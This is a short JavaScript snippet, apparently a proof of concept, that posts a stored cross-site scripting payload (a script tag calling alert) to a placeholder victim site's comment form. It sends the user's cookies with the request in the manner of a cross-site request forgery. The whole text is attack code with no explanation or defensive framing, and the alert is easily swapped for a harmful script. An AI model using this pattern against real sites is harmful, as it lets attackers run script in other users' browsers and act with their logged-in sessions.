const payload = "<script>alert('XSS from evil.local')</script>";
fetch("http://victim.local/comment.php", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "comment=" + encodeURIComponent(payload)
});
